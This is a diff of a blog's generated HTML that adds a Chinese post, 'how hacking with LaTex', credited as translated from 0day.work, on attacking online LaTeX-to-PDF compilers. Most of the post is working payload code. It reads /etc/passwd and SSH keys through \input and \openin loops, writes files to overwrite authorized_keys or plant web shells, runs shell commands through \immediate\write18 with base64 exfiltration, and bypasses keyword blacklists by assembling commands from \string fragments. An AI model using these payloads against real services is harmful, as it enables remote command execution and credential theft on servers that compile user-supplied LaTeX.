@@ -6,15 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Tag: crontab | owefsad&#39;s blog</title>
+  <title>how hacking with LaTex | owefsad&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="owefsad&#39;s blog">
-<meta property="og:url" content="http://yoursite.com/tags/crontab/index.html">
+  <meta name="description" content="简介LaTex常用于编写文档、页面排版, 使用latex语法编写然后经过编译最后形成文档. 互联网上有一种在线输入latex然后生成pdf供用户下载的服务, 这种服务使用pdflatex组件在服务器端编译latex并生成pdf, 由于是客户端输入的数据, 因此具有不安全性, 而pdflatex本身支持读写文件、执行操作系统命令, 构造恶意的代码即可造成远程命令执行或读写文件产生恶意攻击.">
+<meta name="keywords" content="latex">
+<meta property="og:type" content="article">
+<meta property="og:title" content="how hacking with LaTex">
+<meta property="og:url" content="http://yoursite.com/2019/04/24/how-hacking-with-LaTex/index.html">
 <meta property="og:site_name" content="owefsad&#39;s blog">
+<meta property="og:description" content="简介LaTex常用于编写文档、页面排版, 使用latex语法编写然后经过编译最后形成文档. 互联网上有一种在线输入latex然后生成pdf供用户下载的服务, 这种服务使用pdflatex组件在服务器端编译latex并生成pdf, 由于是客户端输入的数据, 因此具有不安全性, 而pdflatex本身支持读写文件、执行操作系统命令, 构造恶意的代码即可造成远程命令执行或读写文件产生恶意攻击.">
 <meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-04-24T14:40:45.441Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="owefsad&#39;s blog">
+<meta name="twitter:title" content="how hacking with LaTex">
+<meta name="twitter:description" content="简介LaTex常用于编写文档、页面排版, 使用latex语法编写然后经过编译最后形成文档. 互联网上有一种在线输入latex然后生成pdf供用户下载的服务, 这种服务使用pdflatex组件在服务器端编译latex并生成pdf, 由于是客户端输入的数据, 因此具有不安全性, 而pdflatex本身支持读写文件、执行操作系统命令, 构造恶意的代码即可造成远程命令执行或读写文件产生恶意攻击.">
   
     <link rel="alternative" href="/atom.xml" title="owefsad&#39;s blog" type="application/atom+xml">
   
@@ -178,79 +183,154 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-how-hacking-with-LaTex" class="article article-type-post " itemscope="" itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/12/11/Vulnhub-Challenging-jarbas/" class="archive-article-date">
-  	<time datetime="2018-12-11T11:28:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-11</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/12/11/Vulnhub-Challenging-jarbas/">Vulnhub Challenging: jarbas</a>
+    <h1 class="article-title" itemprop="name">
+      how hacking with LaTex
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2019/04/24/how-hacking-with-LaTex/" class="archive-article-date">
+  	<time datetime="2019-04-24T14:34:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-04-24</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>简介<br>LaTex常用于编写文档、页面排版, 使用latex语法编写然后经过编译最后形成文档. 互联网上有一种在线输入latex然后生成pdf供用户下载的服务, 这种服务使用pdflatex组件在服务器端编译latex并生成pdf, 由于是客户端输入的数据, 因此具有不安全性, 而pdflatex本身支持读写文件、执行操作系统命令, 构造恶意的代码即可造成远程命令执行或读写文件产生恶意攻击.<br><a id="more"></a></p>
+<h2 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h2><ul>
+<li>attack latex</li>
+<li>绕过黑名单限制</li>
+<li>声明</li>
+</ul>
+<h2 id="attack-latex"><a href="#attack-latex" class="headerlink" title="attack latex"></a>attack latex</h2><p>本文介绍了基于WEB的LaTex编译器的基本攻击,</p>
+<p><strong>TexMaker</strong>是一个在线转换LaTex代码为pdf的网站, 在客户端输入LaTex代码, 服务器端接收LaTex代码后使用<code>pdflatex</code>将LaTex编译为pdf.（互联网上这种类似的服务还有很多）<br><code>LaTex</code>经过了图灵测试, 也就意味着可以用它编写函数, 因此未来可能出现用<code>LaTex</code>编写的恶意软件. 但是, 本文重点关注<code>LaTex</code>读取、写入文件或执行程序的现有方法和可能性. 本文是<a href="https://hovav.net/ucsd/dist/texhack.pdf" target="_blank" rel="noopener">paper</a>的延伸.</p>
+<p><strong>Pdflatex</strong>有三种操作模式</p>
+<ul>
+<li>no-shell-escape<br>进行<code>\write18{command}</code>执行, 即使函数已经在texmf.cnf文件中启用</li>
+<li>shell-restricted<br>与shell-escape类似, 但是只能执行安全的预定义命令集</li>
+<li>shell-escape<br>允许<code>\wite18{command}</code>执行</li>
+</ul>
+<h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><p>Pdflatex的三种模式都允许从文件系统中读取任意文件, 读取文件最简单的方法是使用<code>\input</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\input\&#123;/etc/passwd&#125;</span><br></pre></td></tr></table></figure></p>
+<p>上述命令将读取<code>/etc/passwd</code>文件并写入到生成的PDF文件中</p>
+<p>如果读取的文件以<code>.tex</code>结尾, 可以用<code>\include</code>读取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\include&#123;password&#125;</span><br></pre></td></tr></table></figure></p>
+<p>上述命令将从当前工作目录包含<code>password.tex</code>并将文件内容写入到生成的PDF文件中</p>
+<p>如果上述的两个命令都无法使用, 可以用下面的解决方案:<br>方案一: 读取指定文件的首行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">\newread\file</span><br><span class="line">\openin\file=/etc/passwd</span><br><span class="line">\read\file to\line</span><br><span class="line">\text&#123;\line&#125;</span><br><span class="line">\closein\file</span><br></pre></td></tr></table></figure></p>
+<p>上述代码段创建一个<code>\file</code>处理对象并打开<code>/etc/passwd</code>文件, 读取一行到变量<code>\line</code>中, 将变量<code>\line</code>作为文本(<code>\text</code>)输出, 关闭文件处理对象</p>
+<p>如果想读取全部内容, 可使用下面的代码段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\newread\file</span><br><span class="line">\openin\file=/etc/passwd</span><br><span class="line">\loop\unless\ifeof\file</span><br><span class="line">    \read\file to\fileline</span><br><span class="line">    \text&#123;\fileline&#125;</span><br><span class="line">\repeat</span><br><span class="line">\closein\file</span><br></pre></td></tr></table></figure></p>
+<p>上述代码创建一个<code>\file</code>文件对象, 打开<code>/etc/passwd</code>并读取, 然后用<code>\loop</code>进行循环, 循环内读取一行到<code>\fileline</code>变量中, 将变量作为文本输出, 等遇到<code>EOF</code>或文件读取完毕关闭文件对象.</p>
+<p>读文件功能可以用来读取SSH key、配置文件(找新目标和硬编码等信息)等等</p>
+<h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><p>写文件功能运行在<code>shell-restricted</code>和<code>shell-escape</code>两种模式下, 命令如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\newwrite\outfile</span><br><span class="line">\openout\outfile=cmd.tex</span><br><span class="line">\write\outfile&#123;hello-world&#125;</span><br><span class="line">\closeout\outfile</span><br></pre></td></tr></table></figure></p>
+<p>上述命令将在<code>cmd.tex</code>文件中写入<code>hello-world</code>字符串.</p>
+<p>写文件功能可用来清空文件内容、覆盖其他文件(<code>~/.ssh/authorized_keys</code>、各种配置、一句话木马等)</p>
+<h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p>执行命令依赖于<code>write18</code>命令, 因此只能在<code>-shell-escape</code>模式下运行.<br>命令为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\immediate\write18&#123;env&#125;</span><br></pre></td></tr></table></figure></p>
+<p>上述命令将运行<code>env</code>获取环境变量</p>
+<p>write18命令执行结果将被重定向到标准输出, 输出内容将在<code>epstopdf-sys.cfg</code>这行的下面、<code>pdftex.map</code>这行的上面, 所以可以根据这两个关键字判断是否执行成功.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<p>如果服务器端不返回编译日志的话, 我们无法直接通过上述命令来利用, 这是需要通过重定向将数据写入文件中, 然后将文件读取出来.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\immediate\write18&#123;env &gt; env.tex&#125;</span><br><span class="line">\input&#123;env.tex&#125;</span><br></pre></td></tr></table></figure>
+<p>如果读取的文件中含有LaTex的保留字符, 如<code>$</code>等, 可以使用base64编码之后在写入文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\immediate\write18&#123;env|base64&gt;text.tex&#125;</span><br><span class="line">\input(text.tex)</span><br></pre></td></tr></table></figure></p>
+<h2 id="绕过黑名单"><a href="#绕过黑名单" class="headerlink" title="绕过黑名单"></a>绕过黑名单</h2><p>style 1: 如果<code>input</code>和<code>include</code>命令都不可用, 该如何读取文件?<br>可以创建文件对象读取文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\newread\file</span><br><span class="line">\openin\file=env.tex</span><br><span class="line">\loop\unless\ifeof\file</span><br><span class="line">    \read\file to\fileline</span><br><span class="line">    \text&#123;\fileline&#125;</span><br><span class="line">\repeat</span><br><span class="line">\closein\file</span><br></pre></td></tr></table></figure></p>
+<p>style 2: 如果<code>(inpute|include|write18|immediate)</code>都不可用, 该如何执行命令和读取文件呢?<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">\def \imm &#123;\string\imme&#125;</span><br><span class="line">\def \diate &#123;diate&#125;</span><br><span class="line">\def \eighteen &#123;string18&#125;</span><br><span class="line">\def \wwrite &#123;\string\write\eighteen&#125;</span><br><span class="line">\def \args &#123;\string&#123;ls |base64&gt; test.tex\string&#125;&#125;</span><br><span class="line">\def \inp &#123;\string\in&#125;</span><br><span class="line">\def \iput &#123;put&#125;</span><br><span class="line">\def \cmd &#123;\string&#123;text.tex\string&#125;&#125;</span><br><span class="line"></span><br><span class="line">% first run</span><br><span class="line">\newwrite\outfile</span><br><span class="line">\openout\outfile=cmd.tex</span><br><span class="line">\write\outfile&#123;\imm\diate\wwrite\args&#125;</span><br><span class="line">\write\outfile&#123;\inp\iput\cmd&#125;</span><br><span class="line">\closeout\outfile</span><br><span class="line"></span><br><span class="line">% second run</span><br><span class="line">\newread\file</span><br><span class="line">openin\file=cmd.tex</span><br><span class="line">\loop\unless\ifeof\file</span><br><span class="line">    \read\file to\fileline</span><br><span class="line">    \fileline</span><br><span class="line">\repeat</span><br><span class="line">\closein\file</span><br></pre></td></tr></table></figure></p>
+<p>上述代码, 第一次运行将创建<code>cmd.tex</code>文件并把<code>上面那串代码</code>的写入文件中, 第二次运行将读取<code>cmd.tex</code>然后执行其中的命令.<br>ps://<code>\fileline</code>将执行<code>cmd.tex</code>文件中的命令</p>
+<h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>本文翻译自<a href="https://0day.work/hacking-with-latex/" target="_blank" rel="noopener">0day.work</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">escalate_privilege</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">jenkins</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">crontab</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">latex</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/ctf//" class="article-tag-list-link color4">ctf</a>
+        			<a href="/categories/思路//" class="article-tag-list-link color3">思路</a>
         		</li>
       		
 		</ul>
 	</div>
 
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2019/04/24/how-get-a-reverse-shell/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">how get a reverse shell</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#文章目录"><span class="toc-number">1.</span> <span class="toc-text">文章目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#attack-latex"><span class="toc-number">2.</span> <span class="toc-text">attack latex</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#读文件"><span class="toc-number">2.1.</span> <span class="toc-text">读文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#写文件"><span class="toc-number">2.2.</span> <span class="toc-text">写文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#执行命令"><span class="toc-number">2.3.</span> <span class="toc-text">执行命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过黑名单"><span class="toc-number">3.</span> <span class="toc-text">绕过黑名单</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#声明"><span class="toc-number">4.</span> <span class="toc-text">声明</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
+        </div>
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -275,9 +355,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: true,
 		toc_hide_index: false,
